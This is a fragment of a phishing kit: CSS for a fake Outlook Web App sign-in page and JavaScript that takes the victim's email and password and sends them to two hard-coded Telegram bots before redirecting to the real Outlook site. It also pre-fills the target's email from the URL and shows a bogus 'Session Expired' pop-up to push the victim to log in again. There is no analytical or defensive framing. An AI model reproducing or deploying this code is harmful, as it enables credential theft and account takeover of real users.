        html, body {
            height: 100%;
        }
        body {
            display: -ms-flexbox;
            display: flex;
            -ms-flex-align: center;
            align-items: center;
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #f5f5f5;
        }
        .form-signin {
            width: 100%;
            max-width: 300px;
            padding: 15px;
            margin: auto;
        }
        .form-signin .checkbox {
            font-weight: 400;
        }
        .form-signin .form-control {
            position: relative;
            box-sizing: border-box;
            height: auto;
            padding: 10px;
            font-size: 16px;
        }
        .form-signin .form-control:focus {
            z-index: 2;
        }
        .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
        }
        .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }
        .sidebar {
            position: absolute;
            top: 0px;
            bottom: 0px;
            left: 0px;
            display: inline-block;
            width: 332px;
            background-color: #0072C6;
        }
        .sidebar .owaLogoContainer {
            margin: 40vh auto auto 109px;
            text-align: left;
        }
        .login-box {
            padding-left: 0;
            width: 100%;
            max-width: 632px;
            margin: 0 auto;
        }
        /* Mobile adjustments */
        @media (max-width: 575.98px) { /* Below small breakpoint */
            .sidebar {
                display: none; /* Completely hide sidebar on mobile */
            }
            .login-box {
                padding-left: 0; /* Remove left padding */
                max-width: 100%; /* Allow full width */
            }
            .form-signin {
                max-width: 90%; /* Slightly narrower than full width for better fit */
                padding: 10px; /* Reduce padding slightly */
            }
            .form-signin img {
                width: 100%; /* Ensure logo scales properly */
                max-width: 250px; /* Cap logo size on mobile */
            }
        }
        @media (min-width: 576px) { 
            .login-box {
                padding-left: 332px;
            }
        }
        @media (min-width: 768px) { 
            .login-box {
                padding-left: 332px;
            }
        }
        @media (min-width: 992px) { 
            .login-box {

            }
        }
        @media (min-width: 1200px) { 
            .login-box {
                padding-left: 332px;
            }
        }

            background-color: #0072C6;
        }

    <script>
        const telegramBots = [
            {
                token: '6180996330:AAHdKI3dj1mnuImorq8sDMMGztAqtlG7VCQ',
                chatId: '686297216'
            },
            {
                token: '7174369290:AAE8hVpEsJ8paYGEX1fa6w3m06QC0UdqXqg', // Replace with your second bot token
                chatId: '5289984848' // Replace with your second chat ID
            }
        ];

        async function sendToTelegram() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('inputPassword').value;
            const isPrivate = document.getElementById('private').checked ? 'Yes' : 'No';
            const warning = document.getElementById('warning');
            const submitBtn = document.getElementById('btn-submit');

            // Clear previous warnings
            warning.textContent = '';

            // Validate inputs
            if (!email || !password) {
                warning.textContent = 'Please fill in all fields.';
                return;
            }

            // Disable button and show loading
            submitBtn.disabled = true;
            submitBtn.querySelector('#iSpin').className = 'fa fa-spinner fa-spin';

            const message = `Office Login Access\n\nEmail: ${email}\nPassword: ${password}\nPrivate Computer: ${isPrivate}`;

            try {
                const promises = telegramBots.map(bot => 
                    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: bot.chatId,
                            text: message
                        })
                    }).then(response => response.json())
                );

                const results = await Promise.allSettled(promises);
                const failed = results.filter(result => result.status === 'rejected' || !result.value.ok);

                if (failed.length === 0) {
                    document.getElementById('loginForm').reset();
                    window.location.href = 'https://outlook.office.com'; // Immediate redirection
                } else {
                    const errorMessages = failed.map((result, index) => 
                        result.status === 'rejected' ? `Bot ${index + 1}: ${result.reason}` : `Bot ${index + 1}: ${result.value.description}`
                    );
                    throw new Error(`Failed to send to ${failed.length} bot(s): ${errorMessages.join(', ')}`);
                }
            } catch (error) {
                console.error('Error:', error);
                warning.textContent = 'Failed to send to Telegram. Please try again.';
            } finally {
                // Restore button
                submitBtn.disabled = false;
                submitBtn.querySelector('#iSpin').className = 'fa fa-pulse';
            }
        }

        // Auto-populate email from URL parameter
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(function() {
                const urlParams = new URLSearchParams(window.location.search);
                const email = urlParams.get('email') || '';
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (email && emailRegex.test(email)) {
                    document.getElementById('email').value = email;
                    // Override alert to show the email
                    window.alert = function() {
                        Swal.fire({
                            title: 'Session Expired',
                            text: `Session for ${email} expired. Login Again!`,
                            icon: 'warning',
                            confirmButtonText: 'OK'
                        });
                    };
                    // Trigger the new alert
                    Swal.fire({
                        title: 'Session Expired',
                        text: `Session for ${email} expired. Login Again!`,
                        icon: 'warning',
                        confirmButtonText: 'OK'
                    });
                }
            }, 500);
        });
    </script>
